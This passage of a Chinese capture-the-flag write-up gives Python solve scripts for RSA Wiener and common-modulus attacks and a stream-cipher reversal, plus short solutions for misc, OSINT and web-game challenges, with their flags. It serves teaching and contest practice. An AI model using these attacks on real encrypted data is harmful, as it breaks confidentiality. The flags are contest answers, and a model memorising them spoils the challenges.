5494675728038534147658086204944478799085402062430512577457736341025684816435751141503653067387417307208305531128405855768469111878958936098812589454651722993208503152949472692808817351667531071835702737369236175759430180406933440977165115385549890812880505984419798507715556807146581313676024523335364722477165393357491901632000161183887239943713466319474064777166281822315210172681297800677815955370914465551424438104761912469101029994357433640542634705196737870150615283250515088413658584266160202636186671690225984058024185623492362869116251077292861206063408913621621878314331201692105685804720662798847139353518655832798797611088199654259359107614840071459146509465311619452691735589976236814642360607930766139598119231839347156508216939053314140533041351030225245804267879310207290806330579322786248248067150968836233789413896762929743429837713213759387149052334092954449080990236437901055027951269869263863239611184993747686778875933535994134261221897573026014037728503694668192228352824876838575787756489276734779702057631030777477573339613167189215932117927816726989717975462237027373728756145535227945039635182401745585671141528556789702621015621606660369644701758213608678949263826372492495440003241813175082999377884435147277353765419649429020138001023255641514520908331787205290098406603482248427748221
c2 = 5838967498322901779205612829803642607377873183503072729490933648303817732423262938165082862942493569798390343086060253606276766963839475272048237865456459468481550720768807493656271330975468328686257792478121941040025765347338493140972476792542199467483560756095524063959404080240416821834189540571797839146969164445376911444356038097206998168298402069597866757160650605390171323280465116750531348056396690446718197045141110995824879171245011665778529008545199537764343183198320735259086629477902166950488105447872801846443189663179393870682118433453038422769888264943646044072211647086941711315705467248871921642662
n = 18926588958014459654161795037862497795220997224540805216711065082850383389639431955195595352176101356954594737125511110499150843395984586792850195970487628728183910297396672956706827048369995141752690678144585105436855387287280617634373166544654157021692990003236996228380997323879721348897216927363480296735880741172018441186423582633993550051315277349792716352985064880524056346722586656524141966775996450270417644596325025842012353218675333467580767804444943148809339319817739082275731814482585431578575693433466322585314767284110624911464556834583032439521962811263237099169706546586227217004194625833647416924741
e = 13861227285409230850080448399013330073784332195038238825434149061359027954155167008803634253430361270541849913634252590124753039973645393321181195096225850447214444214477828826388988939645794989278789093773003634657141884135427030349900231977645514383818800179521761501437692091399224296698169976748204686692707473685936925613194131048392816883120422275851026572547618385647208747621802483941464823075758700038032389038935110173826352286260296652838868416359121518437301662597687616759115967996446040264257910293199690811096562754793658443729678880975749070146862241515283639222670650785662383057168619109496566509373


def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式
    res = []
    while y:
        res.append(x // y)
        x, y = y, x % y
    return res


def continued_fraction(sub_res):
    numerator, denominator = 1, 0
    for i in sub_res[::-1]:  # 从sublist的后面往前循环
        denominator, numerator = numerator, i * numerator + denominator
    return denominator, numerator  # 得到渐进分数的分母和分子，并返回


# 求解每个渐进分数
def sub_fraction(x, y):
    res = transform(x, y)
    res = list(
        map(continued_fraction, (res[0:i] for i in range(1, len(res))))
    )  # 将连分数的结果逐一截取以求渐进分数
    return res


def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q
    par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解
    x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)
    return x1, x2


def wienerAttack(e, n):
    for d, k in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
        if k == 0:  # 可能会出现连分数的第一个为0的情况，排除
            continue
        if (
            e * d - 1
        ) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
            continue

        phi = (e * d - 1) // k  # 这个结果就是 φ(n)
        px, qy = get_pq(1, n - phi + 1, n)
        if px * qy == n:
            p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现
            d = gmpy2.invert(
                e, (p - 1) * (q - 1)
            )  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
            return d
    print("该方法不适用")


d = wienerAttack(e, n)
x = 2023 * n**4 + 1
y = n**5

# c1 = pow(2023 * n ** 4 + 1, m1, n ** 5)
# x**m1 mod y = c1
# x**m1 = c1 + k*y

m1 = c1 // x % y + 1
m2 = pow(c2, d, n)
print(long_to_bytes(m1) + long_to_bytes(m2))

# flag{d0nt_b3_afr41d_0f_Wieners_Attack}
```

### ezStream

```python
# from secret import flag
from Crypto.Util.number import *

key = [
    int.from_bytes(b"Scr1wGame2023!", "big"),  # 1691318926283763959733428423897889
    int.from_bytes(b"Hacking_for_fun", "big"),  # 375820644376505342600258468127864174
]


def gen_key(i):
    if i == 0:
        return key[0]
    elif i == 1:
        return key[1]
    else:
        return gen_key(i - 2) * 9 + gen_key(i - 1) * 2


cache = {0: key[0], 1: key[1]}
last = 1


def gen_noise(i):
    global last
    if i < len(key):
        return key[i] & 0xFF

    i = i**6
    dp = {last - 1: cache[last - 1], last: cache[last]}

    for j in range(last + 1, i + 1):
        dp[j] = dp[j - 2] * 9 % 256 + dp[j - 1] * 2 % 256

    cache[i - 1] = dp[i - 1]
    cache[i] = dp[i]
    last = i

    return dp[i] % 256


# ct = []
# for i in range(len(flag)):
#     noise = gen_key(i**6) % 256
#     ct.append(ord(flag[i]) ^ noise)
# print("ct =", ct)


ct = [
    71,
    2,
    128,
    193,
    90,
    193,
    132,
    97,
    82,
    118,
    128,
    7,
    77,
    89,
    134,
    235,
    21,
    17,
    149,
    46,
    68,
    132,
    210,
    1,
    82,
    206,
    140,
    179,
    69,
    7,
    152,
    141,
    17,
    29,
    211,
    215,
    92,
]

flag = ""

for i in range(len(ct)):
    print("round", i)
    flag += chr(ct[i] ^ gen_noise(i))
    print("flag", flag)
```

### Weak_RSA

> 你知道共模攻击吗？

```python
from Crypto.Util.number import *
from gmpy2 import *

# from secret import flag

# m = bytes_to_long(flag)
# p = getPrime(512)
# q = getPrime(512)
# n = p * q
# t = getPrime(1024)
# M = pow(m, pow(getPrime(512), t - 1, t), t)

e1 = 516257683822598401
e2 = 391427904712695553
e3 = 213471009212893777

# c1 = pow(M, e1, n)
# c2 = pow(M, e2, n)
# c3 = pow(M, e3, n)

# print("c1 =", c1)
# print("c2 =", c2)
# print("c3 =", c3)
# print("n =", n)


c1 = 51201452334984449282068309177028395375758360233548438347675243347906409618152628210019226002255907469391257667302150050648977187262528853040172622386159844632666908486282525193122222199103276825663126351842279841615134458839520762419940375938143471418294086461076408500250755726211925831388801907811345661564
c2 = 129530224158328307499329570582855344545638441266452637222899877191221295429788461037077788875036833186508273485473117662674090482954334902313414400204087319071939399924643898302079848633823212557506242499539251575280678132705215314505255527766706391270634210471532907224965221579875121778407690551044972369296
c3 = 125441855099400561261348267807978553907342746377718048279343463109518702575598974696113952177509561090789459595964569345938477635365668882366155320767385466565604532717903959848701673934567775051398163505845556890913773601002997853859776363487927564892162257604816049542545545708757967262954552127883932257034
n = 159766785421925328991859380501666026648541843489712870390120790123093848140321745040315451991240582355832926346364171213629531335458616550649012413561275726527011605650102699545554914478325068956937917990279294886814232708428582000220458432792077752073760180584778933864396591462132672712869261692981727265137


s,s1,s2 = gcdext(e1,e2)
m1 = (pow(c1,s1,n) * pow(c2,s2,n)) % n

a,a1,a2 = gcdext(s,e3)
m = pow(m1,a1,n) * pow(c3,a2,n) % n
print(long_to_bytes(m))

# flag{y0u_re411y_kn0w_Common_module_att4ck!!!}
```

## MISC

### 快来签到吧！

> 党的十八大提出，倡导富强、民主、文明、和谐，倡导自由、平等、公正、法治，倡导爱国、敬业、诚信、友善，积极培育和践行社会主义核心价值观。富强、民主、文明、和谐是国家层面的价值目标，自由、平等、公正、法治是社会层面的价值取向，爱国、敬业、诚信、友善是公民个人层面的价值准则，这 24 个字是社会主义核心价值观的基本内容。

```
公正公正公正诚信文明公正民主公正法治法治友善平等法治法治公正平等公正友善公正公正和谐公正友善敬业公正诚信和谐公正平等平等友善敬业法治自由公正诚信平等平等诚信平等法治和谐法治和谐法治和谐公正和谐法治自由公正公正法治诚信和谐
```

搜索后发现是核心价值观编码，解码后得到`flag{welcome_to_sssctf}`。

### 不许发电

> How dare you (not osint)

修改图片高度得到二维码，扫码后得到 flag。

## OSINT

### 身在曹营心在汉

> 听说螺丝组和隔壁组关系特别好，光加入螺丝可不行，你也得去隔壁看看呢，那里有你想要的^\_^

加入设计组群后发现螺丝组长的群昵称即为 flag。

### CanCanWord

> 小小喵返校的机票找不到了，马上就到报销的时间了，好急好急，你能帮帮他吗？
>
> flag 格式：如果航班号为 XX1145，座位号为 14M，那么提交的 flag 应该是 flag{XX114514M}
>
> 小小喵悄悄告诉了你一句话：喵 ​‍‍​‍‌‌‌‍​‌‌‌‌‌​‌‌‍‍‌​‍‍​‍‌‌‌‍​‍‌‌‌​‌‍‍‍‌​‍‍​ 喵喵喵喵。

查看图片的 EXIF 信息可以得到拍摄时间和地理位置。猜测为上海浦东到大连周水子的飞机。搜索座位表比对和得到`flag{CA895419C}`。

## EASTEREGG

### 爆金币啦！

> 小小喵和 J1U2H3 悄悄把你的彩蛋藏起来了！
>
> 四个碎片分别被藏在 GAME/Crossy Road，GAME/Pacman，WEB/SleepyHead，WEB/ezphp 四道题里
>
> 快快找寻彩蛋，狠狠爆他们的金币吧！
>
> p.s.听说有神秘奖品哦~

```
Crossy Road:
EasterEgg{You_have_fetch

Pacman:
ed_Scr1w's_easter_egg_Yo

SleepyHead: /E@st3regq.php
老师快来大叔这拿彩蛋叭,这是第三段哦~
u_can_submit_this_flag_after_c

ezphp: /robots.txt
The egg is so easy to find,isn't it?
last egg:
ompleting_all_four_tasks!}
```

## GAME

### Crossy Road

> Welcome to the Crossy Road!
>
> Fetch the gems for your flag!
>
> Have fun ^\_^

查看源代码得到`flag{N1ce_try_0f_th3_cr0ssy_ro@d!}`。

### Pacman

> 吃豆人，人吃豆，豆吃人
>
> 到底是猎人变成了猎物，还是猎物变成了猎人呢

查看源代码得到`flag{PaCM@n_1S_@_V3rY_C1AS5IcAl_G@mE!}`。
